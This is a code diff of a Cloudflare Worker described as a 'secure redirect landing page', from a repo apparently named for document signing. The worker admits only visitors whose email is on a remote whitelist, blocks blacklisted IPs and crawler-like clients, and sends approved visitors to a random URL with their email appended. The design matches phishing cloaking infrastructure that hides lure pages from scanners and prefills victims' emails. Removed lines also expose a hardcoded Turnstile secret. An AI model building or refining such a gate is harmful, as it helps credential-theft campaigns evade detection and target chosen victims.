@@ -1,6 +1,4 @@
-// Cloudflare Worker for secure redirect landing page
-// Enhanced with KV storage, advanced bot protection, and real-time updates
-
+// Cloudflare Worker for secure redirect landing page - OPTIMIZED FOR LARGE DATASETS
 export default {
   async fetch(request, env, ctx) {
     const url = new URL(request.url);
@@ -13,8 +11,20 @@ export default {
         headers: {
           'Access-Control-Allow-Origin': '*',
           'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
-          'Access-Control-Allow-Headers': 'Content-Type, X-Client-Hash, X-User-Agent, X-Screen-Resolution',
+          'Access-Control-Allow-Headers': 'Content-Type',
         },
+      });
+    }
+
+    // Rate limiting check
+    const rateLimitResult = await checkRateLimit(request, env);
+    if (!rateLimitResult.allowed) {
+      return new Response(JSON.stringify({ 
+        success: false, 
+        message: 'Too many requests. Please try again later.' 
+      }), {
+        status: 429,
+        headers: { 'Content-Type': 'application/json' }
       });
     }
 
@@ -36,18 +46,93 @@ export default {
       return handleValidation(request, env);
     }
 
-    if (path === '/api/config') {
-      return handleConfigRequest(request, env);
-    }
-
-    if (path === '/api/analytics') {
-      return handleAnalyticsRequest(request, env);
-    }
-
     // 404 for unknown routes
     return new Response('Not Found', { status: 404 });
   },
 };
+
+// Rate limiting function
+async function checkRateLimit(request, env) {
+  const clientIP = request.headers.get('CF-Connecting-IP') || 
+                  request.headers.get('X-Forwarded-For') || 
+                  'unknown';
+  
+  const maxRequests = parseInt(env.RATE_LIMIT_MAX_REQUESTS || '10');
+  const windowSeconds = parseInt(env.RATE_LIMIT_WINDOW || '60');
+  const now = Math.floor(Date.now() / 1000);
+  const windowStart = now - windowSeconds;
+  
+  const key = `rate_limit:${clientIP}`;
+  
+  try {
+    // Get current requests from KV
+    const currentData = await env.RATE_LIMIT_KV.get(key, { type: 'json' });
+    const requests = currentData ? currentData.requests.filter(timestamp => timestamp > windowStart) : [];
+    
+    if (requests.length >= maxRequests) {
+      return { allowed: false, remaining: 0 };
+    }
+    
+    // Add current request
+    requests.push(now);
+    
+    // Store updated data with TTL
+    await env.RATE_LIMIT_KV.put(key, JSON.stringify({ requests }), {
+      expirationTtl: windowSeconds + 60 // Add 1 minute buffer
+    });
+    
+    return { 
+      allowed: true, 
+      remaining: maxRequests - requests.length 
+    };
+  } catch (error) {
+    console.error('Rate limiting error:', error);
+    // Allow request if rate limiting fails
+    return { allowed: true, remaining: 1 };
+  }
+}
+
+// Optimized caching function with TTL
+async function getCachedData(key, env) {
+  try {
+    const cacheKey = `cache:${key}`;
+    const cached = await env.RATE_LIMIT_KV.get(cacheKey, { type: 'json' });
+    
+    if (cached && cached.timestamp) {
+      const ttl = parseInt(env.CACHE_TTL || '300'); // 5 minutes default
+      const now = Date.now();
+      
+      if (now - cached.timestamp < ttl * 1000) {
+        console.log(`Cache hit for key: ${key}`);
+        return cached.data;
+      }
+    }
+    
+    return null;
+  } catch (error) {
+    console.error('Cache error:', error);
+    return null;
+  }
+}
+
+// Set cached data with TTL
+async function setCachedData(key, data, env) {
+  try {
+    const cacheKey = `cache:${key}`;
+    const ttl = parseInt(env.CACHE_TTL || '300');
+    
+    await env.RATE_LIMIT_KV.put(cacheKey, JSON.stringify({
+      data,
+      timestamp: Date.now()
+    }), {
+      expirationTtl: ttl + 60 // Add 1 minute buffer
+    });
+    
+    console.log(`Cached data for key: ${key}`);
+  } catch (error) {
+    console.error('Cache set error:', error);
+  }
+}
 
 async function handleValidation(request, env) {
   try {
@@ -60,63 +145,12 @@ async function handleValidation(request, env) {
                     request.headers.get('X-Forwarded-For') || 
                     'unknown';
 
-    // Enhanced bot protection - Browser fingerprinting
-    const userAgent = request.headers.get('User-Agent') || '';
-    const clientHash = request.headers.get('X-Client-Hash') || '';
-    const screenResolution = request.headers.get('X-Screen-Resolution') || '';
-    
-    // Bot detection checks
-    const botScore = await analyzeBotBehavior(clientIP, userAgent, clientHash, screenResolution);
-    if (botScore > 0.8) {
-      console.log(`High bot score detected for IP: ${clientIP}, score: ${botScore}`);
-      return new Response(JSON.stringify({ 
-        success: false, 
-        message: 'Access denied' 
-      }), {
-        status: 403,
-        headers: { 'Content-Type': 'application/json' }
-      });
-    }
-
-    // Check blacklist
-    const blacklist = await getBlacklist();
-    if (blacklist.includes(clientIP)) {
-      console.log(`Blocked blacklisted IP: ${clientIP}`);
-      return new Response(JSON.stringify({ 
-        success: false, 
-        message: 'Access denied' 
-      }), {
-        status: 403,
-        headers: { 'Content-Type': 'application/json' }
-      });
-    }
-
-    // Enhanced rate limiting with KV storage and exponential backoff
-    const rateLimit = await checkRateLimitEnhanced(clientIP, env);
-    if (!rateLimit.allowed) {
-      const delay = calculateExponentialBackoff(rateLimit.attempts);
-      console.log(`Rate limited IP: ${clientIP}, attempts: ${rateLimit.attempts}, delay: ${delay}s`);
-      return new Response(JSON.stringify({ 
-        success: false, 
-        message: `Too many attempts. Try again in ${rateLimit.retryAfter} seconds.`,
-        retryAfter: rateLimit.retryAfter,
-        delay: delay
-      }), {
-        status: 429,
-        headers: { 
-          'Content-Type': 'application/json',
-          'Retry-After': rateLimit.retryAfter.toString()
-        }
-      });
-    }
-
     const body = await request.json();
     const { email, turnstileToken, honeypotField } = body;
 
     // Honeypot field validation
     if (honeypotField && honeypotField.trim() !== '') {
       console.log(`Honeypot field filled by IP: ${clientIP}`);
-      await logSuspiciousActivity(clientIP, 'honeypot_filled', env);
       return new Response(JSON.stringify({ 
         success: false, 
         message: 'Access denied' 
@@ -136,26 +170,22 @@ async function handleValidation(request, env) {
       });
     }
 
-    // Enhanced email validation
-    const emailValidation = await validateEmailEnhanced(email);
-    if (!emailValidation.valid) {
+    // Basic email validation
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailRegex.test(email)) {
       return new Response(JSON.stringify({ 
         success: false, 
-        message: emailValidation.message 
+        message: 'Invalid email format' 
       }), {
         status: 400,
         headers: { 'Content-Type': 'application/json' }
       });
     }
 
-    // Time-based challenge difficulty
-    const challengeDifficulty = await getChallengeDifficulty(clientIP, env);
-    
-    // Verify Turnstile token with dynamic difficulty
-    const turnstileValid = await verifyTurnstileEnhanced(turnstileToken, clientIP, challengeDifficulty);
+    // Verify Turnstile token
+    const turnstileValid = await verifyTurnstile(turnstileToken, clientIP);
     if (!turnstileValid) {
       console.log(`Invalid Turnstile token for IP: ${clientIP}`);
-      await incrementFailedAttemptsEnhanced(clientIP, env);
       return new Response(JSON.stringify({ 
         success: false, 
         message: 'Verification failed. Please complete the challenge and try again.' 
@@ -165,16 +195,28 @@ async function handleValidation(request, env) {
       });
     }
 
-    // Check if email is in whitelist (real-time from GitHub)
-    const whitelist = await getWhitelistRealTime();
-    const isWhitelisted = whitelist.includes(email);
+    // Check blacklist first
+    const blacklist = await getBlacklist(env);
+    if (blacklist.includes(clientIP)) {
+      console.log(`Blocked blacklisted IP: ${clientIP}`);
+      return new Response(JSON.stringify({ 
+        success: false, 
+        message: 'Access denied' 
+      }), {
+        status: 403,
+        headers: { 'Content-Type': 'application/json' }
+      });
+    }
+
+    // OPTIMIZED: Check if email is in whitelist using Set for O(1) lookup
+    const whitelistSet = await getWhitelistSet(env);
+    const emailToCheck = email.toLowerCase();
+    const isWhitelisted = whitelistSet.has(emailToCheck);
+    
+    console.log(`Email check: "${emailToCheck}" - Whitelist size: ${whitelistSet.size} - Found: ${isWhitelisted}`);
 
     if (!isWhitelisted) {
-      // Increment failed attempts with exponential backoff
-      await incrementFailedAttemptsEnhanced(clientIP, env);
-      
       console.log(`Unauthorized access attempt - IP: ${clientIP}, Email: ${email}`);
-      await logSuspiciousActivity(clientIP, 'unauthorized_email', env);
       return new Response(JSON.stringify({ 
         success: false, 
         message: 'Sorry, this email isn\'t associated with this secure link' 
@@ -184,8 +226,8 @@ async function handleValidation(request, env) {
       });
     }
 
-    // Get random redirect URL (real-time from GitHub)
-    const redirectUrl = await getRandomRedirectUrlRealTime();
+    // Get random redirect URL
+    const redirectUrl = await getRandomRedirectUrl(env);
     if (!redirectUrl) {
       return new Response(JSON.stringify({ 
         success: false, 
@@ -197,10 +239,8 @@ async function handleValidation(request, env) {
     }
 
     // Append email to redirect URL
-    const finalUrl = `${redirectUrl}#${encodeURIComponent(email)}`;
+    const finalUrl = `${redirectUrl}${email}`;
 
-    // Log successful access with enhanced analytics
-    await logSuccessfulAccess(clientIP, email, finalUrl, env);
     console.log(`Successful redirect - IP: ${clientIP}, Email: ${email}, URL: ${finalUrl}`);
 
     return new Response(JSON.stringify({ 
@@ -253,36 +293,274 @@ async function verifyTurnstile(token, clientIP) {
   }
 }
 
-async function getWhitelist() {
+async function getBlacklist(env) {
   try {
-    // In production, fetch from your GitHub repo
-    const response = await fetch('https://raw.githubusercontent.com/docxsigned/secure-redirect-landing/main/data/list.json');
-    const data = await response.json();
-    return data.emails || [];
-  } catch (error) {
-    console.error('Error fetching whitelist:', error);
-    return [];
-  }
-}
+    // Check cache first
+    const cached = await getCachedData('blacklist', env);
+    if (cached) return cached;
 
-async function getBlacklist() {
-  try {
-    // In production, fetch from your GitHub repo
-    const response = await fetch('https://raw.githubusercontent.com/docxsigned/secure-redirect-landing/main/data/blacklist.txt');
-    const text = await response.text();
-    return text.split('\n').filter(ip => ip.trim() !== '');
+    // Try multiple approaches for loading blacklist
+    let blacklist = [];
+    
+    // Method 1: Try GitHub API with raw content
+    try {
+      const headers = {
+        'User-Agent': 'Secure-Redirect-Worker/1.0',
+        'Accept': 'application/vnd.github.v3.raw'
+      };
+
+      if (env.GITHUB_API_TOKEN) {
+        headers['Authorization'] = `token ${env.GITHUB_API_TOKEN}`;
+      }
+
+      const response = await fetch(
+        `https://api.github.com/repos/${env.GITHUB_REPO_OWNER}/${env.GITHUB_REPO_NAME}/contents/data/blacklist.txt?ref=${env.GITHUB_BRANCH}`,
+        { headers }
+      );
+
+      if (response.ok) {
+        const data = await response.json();
+        const content = atob(data.content);
+        blacklist = content.split('\n').filter(ip => ip.trim() !== '');
+        console.log(`Method 1 success: Loaded ${blacklist.length} IPs from GitHub API`);
+      } else {
+        console.log(`Method 1 failed: ${response.status} ${response.statusText}`);
+      }
+    } catch (error) {
+      console.error('Method 1 error:', error);
+    }
+
+    // Method 2: Try raw.githubusercontent.com if Method 1 failed
+    if (blacklist.length === 0) {
+      try {
+        const response = await fetch(
+          `https://raw.githubusercontent.com/${env.GITHUB_REPO_OWNER}/${env.GITHUB_REPO_NAME}/${env.GITHUB_BRANCH}/data/blacklist.txt`
+        );
+
+        if (response.ok) {
+          const content = await response.text();
+          blacklist = content.split('\n').filter(ip => ip.trim() !== '');
+          console.log(`Method 2 success: Loaded ${blacklist.length} IPs from raw.githubusercontent.com`);
+        } else {
+          console.log(`Method 2 failed: ${response.status} ${response.statusText}`);
+        }
+      } catch (error) {
+        console.error('Method 2 error:', error);
+      }
+    }
+
+    // Cache the result
+    if (blacklist.length > 0) {
+      await setCachedData('blacklist', blacklist, env);
+      console.log(`Cached ${blacklist.length} IPs for future requests`);
+    } else {
+      console.log('No blacklist entries found or all methods failed');
+    }
+    
+    return blacklist;
   } catch (error) {
     console.error('Error fetching blacklist:', error);
     return [];
   }
 }
 
-async function getRandomRedirectUrl() {
+// OPTIMIZED: Get whitelist as Set for O(1) lookup performance
+async function getWhitelistSet(env) {
   try {
-    // In production, fetch from your GitHub repo
-    const response = await fetch('https://raw.githubusercontent.com/docxsigned/secure-redirect-landing/main/data/url.json');
-    const data = await response.json();
-    const urls = data.urls || [];
+    // Check cache first
+    const cached = await getCachedData('whitelist_set', env);
+    if (cached) {
+      console.log(`Cache hit: Loaded ${cached.length} emails from cache`);
+      return new Set(cached);
+    }
+
+    // Try multiple approaches for large files
+    let emails = [];
+    
+    // Method 1: Try GitHub API with raw content
+    try {
+      const headers = {
+        'User-Agent': 'Secure-Redirect-Worker/1.0',
+        'Accept': 'application/vnd.github.v3.raw'
+      };
+
+      if (env.GITHUB_API_TOKEN) {
+        headers['Authorization'] = `token ${env.GITHUB_API_TOKEN}`;
+      }
+
+      const response = await fetch(
+        `https://api.github.com/repos/${env.GITHUB_REPO_OWNER}/${env.GITHUB_REPO_NAME}/contents/data/list.json?ref=${env.GITHUB_BRANCH}`,
+        { headers }
+      );
+
+      if (response.ok) {
+        const data = await response.json();
+        const content = atob(data.content);
+        const jsonData = JSON.parse(content);
+        emails = (jsonData.emails || []).map(email => email.toLowerCase());
+        console.log(`Method 1 success: Loaded ${emails.length} emails from GitHub API`);
+      } else {
+        console.log(`Method 1 failed: ${response.status} ${response.statusText}`);
+      }
+    } catch (error) {
+      console.error('Method 1 error:', error);
+    }
+
+    // Method 2: Try raw.githubusercontent.com if Method 1 failed
+    if (emails.length === 0) {
+      try {
+        const response = await fetch(
+          `https://raw.githubusercontent.com/${env.GITHUB_REPO_OWNER}/${env.GITHUB_REPO_NAME}/${env.GITHUB_BRANCH}/data/list.json`
+        );
+
+        if (response.ok) {
+          const jsonData = await response.json();
+          emails = (jsonData.emails || []).map(email => email.toLowerCase());
+          console.log(`Method 2 success: Loaded ${emails.length} emails from raw.githubusercontent.com`);
+        } else {
+          console.log(`Method 2 failed: ${response.status} ${response.statusText}`);
+        }
+      } catch (error) {
+        console.error('Method 2 error:', error);
+      }
+    }
+
+    // Method 3: Try text file approach if JSON is too large
+    if (emails.length === 0) {
+      try {
+        const response = await fetch(
+          `https://raw.githubusercontent.com/${env.GITHUB_REPO_OWNER}/${env.GITHUB_REPO_NAME}/${env.GITHUB_BRANCH}/data/emails.txt`
+        );
+
+        if (response.ok) {
+          const text = await response.text();
+          emails = text.split('\n')
+            .map(line => line.trim())
+            .filter(email => email && email.includes('@'))
+            .map(email => email.toLowerCase());
+          console.log(`Method 3 success: Loaded ${emails.length} emails from text file`);
+        } else {
+          console.log(`Method 3 failed: ${response.status} ${response.statusText}`);
+        }
+      } catch (error) {
+        console.error('Method 3 error:', error);
+      }
+    }
+
+    // Convert to Set for O(1) lookup
+    const whitelistSet = new Set(emails);
+    
+    // Cache the result as array (Set can't be serialized)
+    if (emails.length > 0) {
+      await setCachedData('whitelist_set', emails, env);
+      console.log(`Cached ${whitelistSet.size} emails for future requests`);
+    } else {
+      console.error('All methods failed to load emails');
+    }
+    
+    return whitelistSet;
+  } catch (error) {
+    console.error('Error fetching whitelist:', error);
+    return new Set();
+  }
+}
+
+// Legacy function for backward compatibility
+async function getWhitelist(env) {
+  const whitelistSet = await getWhitelistSet(env);
+  return Array.from(whitelistSet);
+}
+
+async function getRandomRedirectUrl(env) {
+  try {
+    // Check cache first
+    const cached = await getCachedData('redirect_urls', env);
+    if (cached) {
+      const urls = cached;
+      if (urls.length === 0) return null;
+      const randomIndex = Math.floor(Math.random() * urls.length);
+      return urls[randomIndex];
+    }
+
+    // Try multiple approaches for loading URLs
+    let urls = [];
+    
+    // Method 1: Try GitHub API with raw content
+    try {
+      const headers = {
+        'User-Agent': 'Secure-Redirect-Worker/1.0',
+        'Accept': 'application/vnd.github.v3.raw'
+      };
+
+      if (env.GITHUB_API_TOKEN) {
+        headers['Authorization'] = `token ${env.GITHUB_API_TOKEN}`;
+      }
+
+      const response = await fetch(
+        `https://api.github.com/repos/${env.GITHUB_REPO_OWNER}/${env.GITHUB_REPO_NAME}/contents/data/url.json?ref=${env.GITHUB_BRANCH}`,
+        { headers }
+      );
+
+      if (response.ok) {
+        const data = await response.json();
+        const content = atob(data.content);
+        const jsonData = JSON.parse(content);
+        urls = jsonData.urls || [];
+        console.log(`Method 1 success: Loaded ${urls.length} URLs from GitHub API`);
+      } else {
+        console.log(`Method 1 failed: ${response.status} ${response.statusText}`);
+      }
+    } catch (error) {
+      console.error('Method 1 error:', error);
+    }
+
+    // Method 2: Try raw.githubusercontent.com if Method 1 failed
+    if (urls.length === 0) {
+      try {
+        const response = await fetch(
+          `https://raw.githubusercontent.com/${env.GITHUB_REPO_OWNER}/${env.GITHUB_REPO_NAME}/${env.GITHUB_BRANCH}/data/url.json`
+        );
+
+        if (response.ok) {
+          const jsonData = await response.json();
+          urls = jsonData.urls || [];
+          console.log(`Method 2 success: Loaded ${urls.length} URLs from raw.githubusercontent.com`);
+        } else {
+          console.log(`Method 2 failed: ${response.status} ${response.statusText}`);
+        }
+      } catch (error) {
+        console.error('Method 2 error:', error);
+      }
+    }
+
+    // Method 3: Try text file approach if JSON is too large
+    if (urls.length === 0) {
+      try {
+        const response = await fetch(
+          `https://raw.githubusercontent.com/${env.GITHUB_REPO_OWNER}/${env.GITHUB_REPO_NAME}/${env.GITHUB_BRANCH}/data/urls.txt`
+        );
+
+        if (response.ok) {
+          const text = await response.text();
+          urls = text.split('\n')
+            .map(line => line.trim())
+            .filter(url => url && url.startsWith('http'));
+          console.log(`Method 3 success: Loaded ${urls.length} URLs from text file`);
+        } else {
+          console.log(`Method 3 failed: ${response.status} ${response.statusText}`);
+        }
+      } catch (error) {
+        console.error('Method 3 error:', error);
+      }
+    }
+
+    // Cache the result
+    if (urls.length > 0) {
+      await setCachedData('redirect_urls', urls, env);
+      console.log(`Cached ${urls.length} URLs for future requests`);
+    } else {
+      console.error('All methods failed to load redirect URLs');
+    }
     
     if (urls.length === 0) return null;
     
@@ -291,349 +569,6 @@ async function getRandomRedirectUrl() {
   } catch (error) {
     console.error('Error fetching redirect URLs:', error);
     return null;
-  }
-}
-
-// Enhanced rate limiting with KV storage and exponential backoff
-async function checkRateLimitEnhanced(clientIP, env) {
-  const now = Date.now();
-  const windowMs = 15 * 60 * 1000; // 15 minutes
-  const maxAttempts = 3;
-
-  try {
-    // Use KV for persistent rate limiting
-    const rateLimitKey = `rate_limit:${clientIP}`;
-    const rateLimitData = await env.RATE_LIMIT_KV.get(rateLimitKey, { type: 'json' });
-    
-    const attempts = rateLimitData?.attempts || [];
-    const recentAttempts = attempts.filter(timestamp => now - timestamp < windowMs);
-
-    if (recentAttempts.length >= maxAttempts) {
-      const oldestAttempt = Math.min(...recentAttempts);
-      const retryAfter = Math.ceil((oldestAttempt + windowMs - now) / 1000);
-      
-      return {
-        allowed: false,
-        attempts: recentAttempts.length,
-        retryAfter
-      };
-    }
-
-    return { allowed: true, attempts: recentAttempts.length };
-  } catch (error) {
-    console.error('Rate limit check error:', error);
-    // Fallback to allow access if KV fails
-    return { allowed: true, attempts: 0 };
-  }
-}
-
-async function incrementFailedAttemptsEnhanced(clientIP, env) {
-  const now = Date.now();
-  const windowMs = 15 * 60 * 1000;
-  
-  try {
-    const rateLimitKey = `rate_limit:${clientIP}`;
-    const rateLimitData = await env.RATE_LIMIT_KV.get(rateLimitKey, { type: 'json' });
-    
-    const attempts = rateLimitData?.attempts || [];
-    attempts.push(now);
-    
-    // Keep only recent attempts
-    const recentAttempts = attempts.filter(timestamp => now - timestamp < windowMs);
-    
-    // Store with TTL (15 minutes)
-    await env.RATE_LIMIT_KV.put(rateLimitKey, JSON.stringify({
-      attempts: recentAttempts,
-      lastUpdated: now
-    }), { expirationTtl: 900 }); // 15 minutes
-  } catch (error) {
-    console.error('Rate limit increment error:', error);
-  }
-}
-
-function calculateExponentialBackoff(attempts) {
-  // Exponential backoff: 2^attempts seconds, max 3600 seconds (1 hour)
-  const baseDelay = Math.pow(2, attempts);
-  return Math.min(baseDelay, 3600);
-}
-
-// Enhanced bot protection
-async function analyzeBotBehavior(clientIP, userAgent, clientHash, screenResolution) {
-  let botScore = 0;
-  
-  // Check for common bot user agents
-  const botPatterns = [
-    /bot/i, /crawler/i, /spider/i, /scraper/i, /curl/i, /wget/i,
-    /python/i, /java/i, /perl/i, /ruby/i, /php/i, /go-http-client/i
-  ];
-  
-  for (const pattern of botPatterns) {
-    if (pattern.test(userAgent)) {
-      botScore += 0.3;
-    }
-  }
-  
-  // Check for missing or suspicious client hash
-  if (!clientHash || clientHash.length < 10) {
-    botScore += 0.2;
-  }
-  
-  // Check for missing screen resolution
-  if (!screenResolution || screenResolution === '0x0') {
-    botScore += 0.2;
-  }
-  
-  // Check for suspicious user agent patterns
-  if (userAgent.length < 20 || userAgent.length > 500) {
-    botScore += 0.1;
-  }
-  
-  // Check for common browser patterns
-  const browserPatterns = [/chrome/i, /firefox/i, /safari/i, /edge/i];
-  let hasBrowserPattern = false;
-  for (const pattern of browserPatterns) {
-    if (pattern.test(userAgent)) {
-      hasBrowserPattern = true;
-      break;
-    }
-  }
-  
-  if (!hasBrowserPattern) {
-    botScore += 0.2;
-  }
-  
-  return Math.min(botScore, 1.0);
-}
-
-// Enhanced email validation
-async function validateEmailEnhanced(email) {
-  // Basic format check
-  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-  if (!emailRegex.test(email)) {
-    return { valid: false, message: 'Invalid email format' };
-  }
-  
-  // Check for disposable email domains
-  const disposableDomains = [
-    '10minutemail.com', 'tempmail.org', 'guerrillamail.com',
-    'mailinator.com', 'throwaway.email', 'temp-mail.org'
-  ];
-  
-  const domain = email.split('@')[1].toLowerCase();
-  if (disposableDomains.includes(domain)) {
-    return { valid: false, message: 'Disposable email addresses are not allowed' };
-  }
-  
-  // Check email length
-  if (email.length > 254) {
-    return { valid: false, message: 'Email address too long' };
-  }
-  
-  return { valid: true, message: 'Email is valid' };
-}
-
-// Time-based challenge difficulty
-async function getChallengeDifficulty(clientIP, env) {
-  try {
-    const now = Date.now();
-    const hour = new Date(now).getHours();
-    
-    // Higher difficulty during peak hours (9 AM - 6 PM)
-    const isPeakHour = hour >= 9 && hour <= 18;
-    
-    // Check recent suspicious activity
-    const suspiciousKey = `suspicious:${clientIP}`;
-    const suspiciousData = await env.RATE_LIMIT_KV.get(suspiciousKey, { type: 'json' });
-    const recentSuspicious = suspiciousData?.count || 0;
-    
-    let difficulty = 'normal';
-    
-    if (isPeakHour) {
-      difficulty = 'high';
-    }
-    
-    if (recentSuspicious > 2) {
-      difficulty = 'very_high';
-    }
-    
-    return difficulty;
-  } catch (error) {
-    console.error('Challenge difficulty error:', error);
-    return 'normal';
-  }
-}
-
-// Enhanced Turnstile verification
-async function verifyTurnstileEnhanced(token, clientIP, difficulty) {
-  try {
-    if (!token) {
-      console.error('No Turnstile token provided for enhanced verification');
-      return false;
-    }
-
-    const formData = new FormData();
-    formData.append('secret', '0x4AAAAAABnQ-ZkgVUTW6mMjwTCvZZm5bks');
-    formData.append('response', token);
-    formData.append('remoteip', clientIP);
-
-    const response = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
-      method: 'POST',
-      body: formData,
-    });
-
-    const result = await response.json();
-    
-    if (!result.success) {
-      console.error('Enhanced Turnstile verification failed:', result);
-      return false;
-    }
-    
-    // Additional difficulty-based validation
-    if (difficulty === 'very_high') {
-      // Add additional checks for very high difficulty
-      const score = result.score || 0.5;
-      const isValid = score > 0.8;
-      console.log(`Difficulty-based validation: score=${score}, required=0.8, valid=${isValid}`);
-      return isValid;
-    }
-    
-    console.log('Turnstile verification successful');
-    return true;
-  } catch (error) {
-    console.error('Enhanced Turnstile verification error:', error);
-    return false;
-  }
-}
-
-// Real-time configuration from GitHub
-async function getWhitelistRealTime() {
-  try {
-    const response = await fetch('https://raw.githubusercontent.com/docxsigned/secure-redirect-landing/main/data/list.json', {
-      headers: {
-        'Cache-Control': 'no-cache',
-        'Pragma': 'no-cache'
-      }
-    });
-    const data = await response.json();
-    return data.emails || [];
-  } catch (error) {
-    console.error('Error fetching real-time whitelist:', error);
-    return [];
-  }
-}
-
-async function getRandomRedirectUrlRealTime() {
-  try {
-    const response = await fetch('https://raw.githubusercontent.com/docxsigned/secure-redirect-landing/main/data/url.json', {
-      headers: {
-        'Cache-Control': 'no-cache',
-        'Pragma': 'no-cache'
-      }
-    });
-    const data = await response.json();
-    const urls = data.urls || [];
-    
-    if (urls.length === 0) return null;
-    
-    const randomIndex = Math.floor(Math.random() * urls.length);
-    return urls[randomIndex];
-  } catch (error) {
-    console.error('Error fetching real-time redirect URLs:', error);
-    return null;
-  }
-}
-
-// Enhanced logging
-async function logSuspiciousActivity(clientIP, activityType, env) {
-  try {
-    const logKey = `suspicious:${clientIP}`;
-    const logData = await env.RATE_LIMIT_KV.get(logKey, { type: 'json' });
-    
-    const now = Date.now();
-    const activities = logData?.activities || [];
-    activities.push({ type: activityType, timestamp: now });
-    
-    // Keep only recent activities (last 24 hours)
-    const dayAgo = now - (24 * 60 * 60 * 1000);
-    const recentActivities = activities.filter(activity => activity.timestamp > dayAgo);
-    
-    await env.RATE_LIMIT_KV.put(logKey, JSON.stringify({
-      activities: recentActivities,
-      count: recentActivities.length,
-      lastUpdated: now
-    }), { expirationTtl: 86400 }); // 24 hours
-  } catch (error) {
-    console.error('Log suspicious activity error:', error);
-  }
-}
-
-async function logSuccessfulAccess(clientIP, email, redirectUrl, env) {
-  try {
-    const now = Date.now();
-    const logEntry = {
-      timestamp: now,
-      ip: clientIP,
-      email: email,
-      redirectUrl: redirectUrl,
-      success: true
-    };
-    
-    // Store in analytics KV
-    const analyticsKey = `analytics:${now}`;
-    await env.RATE_LIMIT_KV.put(analyticsKey, JSON.stringify(logEntry), { expirationTtl: 2592000 }); // 30 days
-  } catch (error) {
-    console.error('Log successful access error:', error);
-  }
-}
-
-// Configuration and analytics endpoints
-async function handleConfigRequest(request, env) {
-  try {
-    const config = {
-      theme: 'auto', // auto, light, dark
-      language: 'en',
-      branding: {
-        title: 'Secure Access Portal',
-        logo: null,
-        primaryColor: '#667eea',
-        secondaryColor: '#764ba2'
-      },
-      features: {
-        darkMode: true,
-        multiLanguage: true,
-        accessibility: true
-      }
-    };
-    
-    return new Response(JSON.stringify(config), {
-      headers: { 'Content-Type': 'application/json' }
-    });
-  } catch (error) {
-    return new Response(JSON.stringify({ error: 'Configuration error' }), {
-      status: 500,
-      headers: { 'Content-Type': 'application/json' }
-    });
-  }
-}
-
-async function handleAnalyticsRequest(request, env) {
-  try {
-    // This would typically aggregate data from KV storage
-    const analytics = {
-      totalRequests: 0,
-      successfulRedirects: 0,
-      blockedAttempts: 0,
-      rateLimited: 0
-    };
-    
-    return new Response(JSON.stringify(analytics), {
-      headers: { 'Content-Type': 'application/json' }
-    });
-  } catch (error) {
-    return new Response(JSON.stringify({ error: 'Analytics error' }), {
-      status: 500,
-      headers: { 'Content-Type': 'application/json' }
-    });
   }
 }
 
@@ -649,23 +584,6 @@ async function serveStaticFile(filename) {
     <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 </head>
 <body>
-    <!-- Theme toggle button -->
-    <div class="theme-toggle">
-        <button id="themeToggle" class="theme-btn" aria-label="Toggle dark mode">
-            <span class="theme-icon">🌙</span>
-        </button>
-    </div>
-
-    <!-- Language selector -->
-    <div class="language-selector">
-        <select id="languageSelect" class="lang-select" aria-label="Select language">
-            <option value="en">English</option>
-            <option value="es">Español</option>
-            <option value="fr">Français</option>
-            <option value="de">Deutsch</option>
-        </select>
-    </div>
-
     <div class="container" id="mainContent">
         <div class="card">
             <div class="header">
@@ -681,9 +599,7 @@ async function serveStaticFile(filename) {
                         placeholder="Enter your email address"
                         required
                         autocomplete="email"
-                        aria-describedby="emailHelp"
                     >
-                    <div id="emailHelp" class="help-text" style="display: none;"></div>
                     
                     <!-- Honeypot field (hidden from users) -->
                     <input 
@@ -698,7 +614,7 @@ async function serveStaticFile(filename) {
                 
                 <!-- Turnstile widget -->
                 <div class="turnstile-container">
-                    <div class="cf-turnstile" data-sitekey="0x4AAAAAABnQ-VuD2fMX2QDA"></div>
+                    <div class="cf-turnstile"></div>
                 </div>
                 
                 <button type="submit" id="submitBtn" class="submit-btn" disabled>
@@ -709,13 +625,6 @@ async function serveStaticFile(filename) {
             
             <div id="message" class="message" style="display: none;" role="alert"></div>
         </div>
-    </div>
-    
-    <!-- Accessibility improvements -->
-    <div class="accessibility-controls">
-        <button id="increaseFontSize" class="accessibility-btn" aria-label="Increase font size">A+</button>
-        <button id="decreaseFontSize" class="accessibility-btn" aria-label="Decrease font size">A-</button>
-        <button id="highContrast" class="accessibility-btn" aria-label="Toggle high contrast">⚫</button>
     </div>
     
     <script src="/script.js"></script>
@@ -743,54 +652,6 @@ async function serveStaticFile(filename) {
     --transition: all 0.3s ease;
 }
 
-/* Dark mode variables */
-[data-theme="dark"] {
-    --primary-color: #8b9df3;
-    --secondary-color: #9b6bb8;
-    --text-color: #ecf0f1;
-    --text-secondary: #bdc3c7;
-    --background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
-    --card-bg: rgba(44, 62, 80, 0.95);
-    --border-color: #34495e;
-}
-
-/* High contrast mode */
-[data-theme="high-contrast"] {
-    --primary-color: #000000;
-    --secondary-color: #ffffff;
-    --text-color: #000000;
-    --text-secondary: #333333;
-    --background: #ffffff;
-    --card-bg: #ffffff;
-    --border-color: #000000;
-}
-
-/* Turnstile Container */
-.turnstile-container {
-    margin: 20px 0;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 65px;
-}
-
-.turnstile-container .cf-turnstile {
-    transform: scale(0.9);
-    transform-origin: center;
-}
-
-/* Disabled button styles */
-.submit-btn:disabled {
-    opacity: 0.6;
-    cursor: not-allowed;
-    background: var(--text-secondary);
-}
-
-.submit-btn:disabled:hover {
-    transform: none;
-    box-shadow: none;
-}
-
 body {
     font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
     background: var(--background);
@@ -802,60 +663,6 @@ body {
     font-size: var(--font-size);
     color: var(--text-color);
     transition: var(--transition);
-}
-
-/* Theme toggle button */
-.theme-toggle {
-    position: fixed;
-    top: 20px;
-    right: 20px;
-    z-index: 1000;
-}
-
-.theme-btn {
-    background: var(--card-bg);
-    border: 2px solid var(--border-color);
-    border-radius: 50%;
-    width: 50px;
-    height: 50px;
-    cursor: pointer;
-    display: flex;
-    align-items: center;
-    justify-content: center;
